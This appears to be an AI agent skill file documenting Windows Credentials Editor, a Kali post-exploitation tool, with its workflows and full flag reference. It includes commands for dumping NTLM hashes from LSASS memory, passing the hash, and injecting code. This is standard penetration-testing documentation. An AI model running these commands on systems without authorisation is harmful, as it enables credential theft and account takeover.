---
name: wce
description: Windows Credentials Editor (WCE) is used to list, add, change, and delete logon sessions and associated Windows credentials such as LM/NT hashes. Use it for performing pass-the-hash attacks natively on Windows, extracting hashes from memory (LSASS), and managing security tokens during post-exploitation, digital forensics, or credential auditing.
---

# Windows Credentials Editor (WCE)

## Overview
Windows Credentials Editor (WCE) is a security tool used to collect and manipulate Windows logon session credentials. It can extract NT/LM hashes from memory without code injection, perform pass-the-hash attacks, and manage authentication tokens. Category: Digital Forensics / Post-Exploitation / Windows Resources.

## Installation (if not already installed)
WCE is typically provided as a Windows executable resource within Kali Linux. If the package is missing:

```bash
sudo apt update && sudo apt install wce
```

The binaries are located at `/usr/share/windows-resources/wce/`. You must transfer these to the target Windows machine to execute them.

## Common Workflows

### List Logon Sessions and Hashes
Run on the target Windows machine to dump all cached NTLM hashes from memory:
```cmd
wce.exe -l
```

### Pass-the-Hash (Native)
Run a command or process as another user using their NTLM hash without knowing the cleartext password:
```cmd
wce.exe -s <username>:<domain>:<lm_hash>:<nt_hash> -c cmd.exe
```

### Extract Hashes via Code Injection
If the default safe reading method fails, force code injection to obtain hashes:
```cmd
wce.exe -i
```

### Delete a Specific Logon Session
Remove a specific session from memory using its LUID:
```cmd
wce.exe -d <LUID>
```

## Complete Command Reference

WCE is a Windows-based tool. The following flags are available when running `wce.exe`:

| Flag | Description |
|------|-------------|
| `-l` | List logon sessions and NTLM credentials (default). |
| `-s <user>:<dom>:<lm>:<nt>` | Change NTLM credentials of current logon session. |
| `-c <cmd>` | Run `<cmd>` in a new session with specified NTLM credentials. |
| `-r` | Refresh and list NTLM credentials every 5 seconds if new sessions are found. |
| `-e` | Refresh and list NTLM credentials every time a logon event occurs. |
| `-o <file>` | Write output to `<file>` in text format. |
| `-g <password>` | Generate LM and NT hashes for the provided `<password>`. |
| `-f` | Force "safe" mode (do not use code injection). |
| `-i` | Force "injection" mode (use code injection to read memory). |
| `-d <LUID>` | Delete a logon session specified by the LUID. |
| `-v` | Verbose output. |
| `-h` | Display help message. |

## Available Binaries
The Kali Linux package includes several versions of the tool located in `/usr/share/windows-resources/wce/`:

- `wce32.exe`: 32-bit Windows version.
- `wce64.exe`: 64-bit Windows version.
- `wce-universal.exe`: Universal binary for multiple architectures.
- `getlsasrvaddr.exe`: Utility to find the address of the LSA service.

## Notes
- **Privileges**: WCE requires Administrator or SYSTEM privileges on the target Windows machine to access LSASS memory.
- **Antivirus**: WCE is widely flagged by Antivirus (AV) and Endpoint Detection and Response (EDR) solutions as malicious.
- **Safety**: The tool defaults to a non-invasive memory reading method, but the `-i` flag can be used if the target OS version requires code injection to access credentials.
- **Legal**: Only use this tool on systems you have explicit permission to test.